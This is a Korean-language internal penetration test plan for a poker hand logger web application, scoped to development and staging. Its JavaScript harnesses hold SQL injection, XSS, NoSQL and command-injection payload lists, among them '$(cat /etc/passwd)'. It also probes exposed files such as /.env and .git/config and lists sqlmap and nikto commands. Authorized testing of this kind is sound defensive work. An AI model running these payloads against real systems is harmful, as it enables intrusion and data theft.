# 포커 핸드 로거 침투 테스트 계획서

## 📋 **테스트 개요**

### 목적
포커 핸드 로거 시스템의 보안 취약점을 체계적으로 발견하고 평가하여 보안 강화 방안을 도출

### 범위
- **대상 시스템**: 포커 핸드 로거 웹 애플리케이션
- **테스트 환경**: 개발/스테이징 환경
- **기간**: 2주 (계획 1주 + 실행 1주)
- **테스트 방법**: 화이트박스 + 블랙박스 테스팅

### 제외 사항
- 프로덕션 환경 직접 테스트
- 실제 사용자 데이터 조작
- 시스템 다운을 유발하는 DoS 공격

## 🎯 **테스트 목표**

### 주요 목표
1. **인증 우회 취약점 발견**
2. **데이터 유출 경로 식별**
3. **권한 상승 가능성 검증**
4. **입력 검증 우회 방법 탐지**
5. **세션 하이재킹 가능성 평가**

### 측정 지표
- 발견된 취약점 수 및 심각도
- 성공적인 공격 시나리오 수
- 데이터 접근 가능 범위
- 시스템 침입 깊이

## 🔍 **테스트 시나리오**

### 1. 인증 및 권한 관리 테스트

#### 1.1 로그인 우회 테스트
```javascript
// 테스트 케이스: SQL Injection을 통한 로그인 우회
const loginPayloads = [
    "admin' OR '1'='1' --",
    "admin' OR '1'='1' /*",
    "' UNION SELECT 1,1,1,1 --",
    "admin'/**/OR/**/1=1--",
    "' OR 1=1#"
];

async function testSQLInjectionLogin() {
    for (const payload of loginPayloads) {
        const response = await fetch('/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: payload,
                password: 'anypassword'
            })
        });
        
        if (response.status === 200) {
            console.log(`🚨 SQL Injection 성공: ${payload}`);
            return true;
        }
    }
    return false;
}
```

#### 1.2 세션 하이재킹 테스트
```javascript
// 테스트 케이스: 세션 토큰 예측 및 탈취
async function testSessionSecurity() {
    const sessions = [];
    
    // 다수의 세션 생성하여 패턴 분석
    for (let i = 0; i < 10; i++) {
        const session = await createTestSession();
        sessions.push(session);
    }
    
    // 세션 토큰 패턴 분석
    const patterns = analyzeSessionPatterns(sessions);
    
    if (patterns.isPredictable) {
        console.log('🚨 세션 토큰이 예측 가능합니다');
        return true;
    }
    
    // 세션 고정 공격 테스트
    return await testSessionFixation();
}

async function testSessionFixation() {
    // 1. 공격자가 세션 ID 획득
    const attackerSession = await getSessionId();
    
    // 2. 피해자에게 세션 ID 전달 시뮬레이션
    const victimResponse = await loginWithFixedSession(attackerSession);
    
    // 3. 공격자가 고정된 세션으로 접근 시도
    const attackResponse = await accessWithSession(attackerSession);
    
    return attackResponse.isAuthenticated;
}
```

### 2. 입력 검증 취약점 테스트

#### 2.1 XSS (Cross-Site Scripting) 테스트
```javascript
// 다양한 XSS 페이로드 테스트
const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    'javascript:alert("XSS")',
    '<svg onload=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    '\'-alert("XSS")-\'',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<body onload=alert("XSS")>',
    '<input onfocus=alert("XSS") autofocus>',
    '<select onfocus=alert("XSS") autofocus>'
];

async function testXSSVulnerability() {
    const vulnerableFields = [
        'playerName',
        'gameNote',
        'tableName',
        'customChips'
    ];
    
    for (const field of vulnerableFields) {
        for (const payload of xssPayloads) {
            const isVulnerable = await submitXSSPayload(field, payload);
            if (isVulnerable) {
                console.log(`🚨 XSS 취약점 발견: ${field} - ${payload}`);
            }
        }
    }
}

async function submitXSSPayload(field, payload) {
    try {
        const formData = {
            [field]: payload
        };
        
        const response = await fetch('/api/updatePlayer', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(formData)
        });
        
        // 응답에서 스크립트가 실행되는지 확인
        const responseText = await response.text();
        return responseText.includes(payload) && !isEscaped(responseText, payload);
        
    } catch (error) {
        return false;
    }
}
```

#### 2.2 인젝션 공격 테스트
```javascript
// NoSQL Injection 테스트 (Google Sheets API 조작)
const nosqlPayloads = [
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$regex": ".*"}',
    '{"$where": "1==1"}',
    '"; return true; var x="'
];

async function testNoSQLInjection() {
    for (const payload of nosqlPayloads) {
        const vulnerable = await testPlayerQuery(payload);
        if (vulnerable) {
            console.log(`🚨 NoSQL Injection 성공: ${payload}`);
        }
    }
}

// Command Injection 테스트
const commandPayloads = [
    '; ls -la',
    '| whoami',
    '& dir',
    '`id`',
    '$(cat /etc/passwd)',
    '; ping google.com',
    '|| echo "vulnerable"'
];

async function testCommandInjection() {
    for (const payload of commandPayloads) {
        const result = await submitCommand(payload);
        if (result.includesSystemOutput) {
            console.log(`🚨 Command Injection 성공: ${payload}`);
        }
    }
}
```

### 3. 권한 상승 테스트

#### 3.1 수직 권한 상승 테스트
```javascript
// 일반 사용자가 관리자 기능에 접근하는 테스트
async function testPrivilegeEscalation() {
    // 1. 일반 사용자로 로그인
    const userSession = await loginAsUser('testuser', 'password');
    
    // 2. 관리자 전용 API 호출 시도
    const adminApis = [
        '/api/admin/deleteAllPlayers',
        '/api/admin/exportData',
        '/api/admin/systemConfig',
        '/api/admin/userManagement'
    ];
    
    for (const api of adminApis) {
        const response = await callAPI(api, userSession);
        if (response.status === 200) {
            console.log(`🚨 권한 상승 성공: ${api}`);
        }
    }
}

// 3.2 수평 권한 상승 테스트 (다른 사용자 데이터 접근)
async function testHorizontalPrivilegeEscalation() {
    const user1Session = await loginAsUser('user1', 'pass1');
    const user2Session = await loginAsUser('user2', 'pass2');
    
    // user1이 user2의 데이터에 접근 시도
    const user2GameId = await getUser2GameId();
    
    const response = await fetch(`/api/game/${user2GameId}`, {
        headers: { 'Authorization': `Bearer ${user1Session.token}` }
    });
    
    if (response.status === 200) {
        console.log('🚨 수평 권한 상승 성공: 다른 사용자 게임 데이터 접근');
        return true;
    }
    
    return false;
}
```

### 4. 데이터 유출 테스트

#### 4.1 민감 정보 노출 테스트
```javascript
async function testSensitiveDataExposure() {
    const endpoints = [
        '/api/debug/config',
        '/api/logs',
        '/.env',
        '/config.json',
        '/admin/phpinfo',
        '/server-status',
        '/.git/config',
        '/backup/',
        '/api/users/all'
    ];
    
    for (const endpoint of endpoints) {
        const response = await fetch(endpoint);
        if (response.status === 200) {
            const content = await response.text();
            if (containsSensitiveInfo(content)) {
                console.log(`🚨 민감 정보 노출: ${endpoint}`);
            }
        }
    }
}

function containsSensitiveInfo(content) {
    const sensitivePatterns = [
        /api[_-]?key/i,
        /secret/i,
        /password/i,
        /token/i,
        /credit[_-]?card/i,
        /ssn/i,
        /email.*@/i
    ];
    
    return sensitivePatterns.some(pattern => pattern.test(content));
}
```

#### 4.2 대량 데이터 추출 테스트
```javascript
async function testMassDataExtraction() {
    // 1. 정상적인 데이터 요청량 테스트
    const normalRequest = await fetchGameData(10);
    
    // 2. 대량 데이터 요청 시도
    const massRequest = await fetchGameData(10000);
    
    if (massRequest.status === 200) {
        console.log('🚨 대량 데이터 추출 가능');
        
        // 3. 속도 제한 없이 연속 요청 가능한지 테스트
        const rapidRequests = await performRapidRequests(100);
        console.log(`연속 요청 성공률: ${rapidRequests.successRate}%`);
    }
}

async function performRapidRequests(count) {
    const requests = [];
    const startTime = Date.now();
    
    for (let i = 0; i < count; i++) {
        requests.push(fetch('/api/gameHistory'));
    }
    
    const responses = await Promise.allSettled(requests);
    const successful = responses.filter(r => r.status === 'fulfilled').length;
    
    return {
        successRate: (successful / count) * 100,
        timeElapsed: Date.now() - startTime,
        requestsPerSecond: count / ((Date.now() - startTime) / 1000)
    };
}
```

### 5. 비즈니스 로직 우회 테스트

#### 5.1 게임 로직 조작 테스트
```javascript
async function testGameLogicManipulation() {
    // 1. 칩 금액 조작 테스트
    const chipManipulationTests = [
        { chips: -999999, description: '음수 칩 설정' },
        { chips: 999999999999, description: '오버플로우 칩 설정' },
        { chips: 'NaN', description: '비숫자 칩 설정' },
        { chips: null, description: 'null 칩 설정' }
    ];
    
    for (const test of chipManipulationTests) {
        const result = await updatePlayerChips('testPlayer', test.chips);
        if (result.success) {
            console.log(`🚨 칩 조작 성공: ${test.description}`);
        }
    }
    
    // 2. 카드 정보 조작 테스트
    const invalidCards = ['XX', '14H', 'AS', '2Z'];
    for (const card of invalidCards) {
        const result = await setPlayerCard('testPlayer', card);
        if (result.success) {
            console.log(`🚨 유효하지 않은 카드 설정 성공: ${card}`);
        }
    }
}

// 5.2 레이스 컨디션 테스트
async function testRaceConditions() {
    // 동시에 같은 플레이어의 칩을 수정하는 요청 보내기
    const playerId = 'testPlayer';
    const initialChips = 1000;
    
    await setPlayerChips(playerId, initialChips);
    
    // 동시에 칩 증가 요청
    const promises = [
        updatePlayerChips(playerId, 500),
        updatePlayerChips(playerId, 300),
        updatePlayerChips(playerId, 200)
    ];
    
    await Promise.all(promises);
    
    const finalChips = await getPlayerChips(playerId);
    const expectedChips = initialChips + 500 + 300 + 200;
    
    if (finalChips !== expectedChips) {
        console.log(`🚨 레이스 컨디션 감지: 예상 ${expectedChips}, 실제 ${finalChips}`);
    }
}
```

## 🛠️ **테스트 도구 및 환경**

### 자동화 도구
```bash
# 웹 취약점 스캐너
nmap -sV --script vuln target-url
nikto -h target-url
sqlmap -u "target-url/login" --data="username=admin&password=pass"

# 브라우저 자동화
npx playwright test security-tests/

# API 테스트
newman run poker-security-tests.postman_collection.json
```

### 수동 테스트 도구
- **Burp Suite Professional**: 웹 애플리케이션 보안 테스트
- **OWASP ZAP**: 오픈소스 보안 테스트 도구
- **Postman**: API 보안 테스트
- **Browser Developer Tools**: 클라이언트 사이드 보안 분석

### 테스트 환경 설정
```javascript
// 테스트 환경 초기화
class PenTestEnvironment {
    constructor() {
        this.baseUrl = 'https://test-poker-logger.example.com';
        this.testUsers = [
            { username: 'testuser1', password: 'TestPass123!', role: 'user' },
            { username: 'testadmin', password: 'AdminPass456!', role: 'admin' },
            { username: 'testguest', password: 'GuestPass789!', role: 'guest' }
        ];
        this.vulnerabilities = [];
    }
    
    async setup() {
        // 테스트 데이터 준비
        await this.createTestUsers();
        await this.setupTestGameData();
        await this.configureTestEnvironment();
    }
    
    logVulnerability(type, severity, description, evidence) {
        this.vulnerabilities.push({
            timestamp: new Date().toISOString(),
            type: type,
            severity: severity,
            description: description,
            evidence: evidence,
            status: 'discovered'
        });
    }
    
    generateReport() {
        return {
            summary: this.generateSummary(),
            vulnerabilities: this.vulnerabilities,
            recommendations: this.generateRecommendations()
        };
    }
}
```

## 📊 **결과 평가 기준**

### 심각도 분류
- **Critical (위험)**: 즉시 시스템 침입 가능
- **High (높음)**: 민감 데이터 유출 가능
- **Medium (보통)**: 제한된 권한으로 부분 침입 가능
- **Low (낮음)**: 정보 수집 가능하나 직접적 피해 제한적

### 성공 기준
- **보안 강화 완료**: 모든 Critical/High 취약점 수정
- **방어 체계 구축**: 실시간 탐지 및 대응 시스템 구축
- **정책 수립 완료**: 보안 운영 절차 및 정책 문서화

## 📋 **테스트 스케줄**

### 1주차: 계획 및 환경 준비
- **Day 1-2**: 테스트 환경 구축 및 도구 설정
- **Day 3-4**: 테스트 시나리오 상세화 및 스크립트 작성
- **Day 5**: 테스트 환경 검증 및 예비 테스트

### 2주차: 본격 침투 테스트
- **Day 1-2**: 인증 및 권한 관리 테스트
- **Day 3**: 입력 검증 및 인젝션 테스트
- **Day 4**: 비즈니스 로직 및 데이터 보안 테스트
- **Day 5**: 결과 분석 및 보고서 작성

## 📝 **보고서 구성**

### 경영진 요약 (Executive Summary)
- 핵심 발견사항
- 비즈니스 영향도
- 우선순위 권고사항

### 기술적 상세 (Technical Details)
- 취약점별 상세 분석
- 공격 시나리오 재현
- 수정 방안 제시

### 부록 (Appendix)
- 테스트 로그 및 증거자료
- 사용된 도구 및 방법론
- 참고 자료 및 표준

---

**문서 작성자**: 보안 감사팀
**승인자**: 정보보안팀장
**배포 대상**: 개발팀, 운영팀, 경영진
**기밀 등급**: 사내 기밀 (Confidential)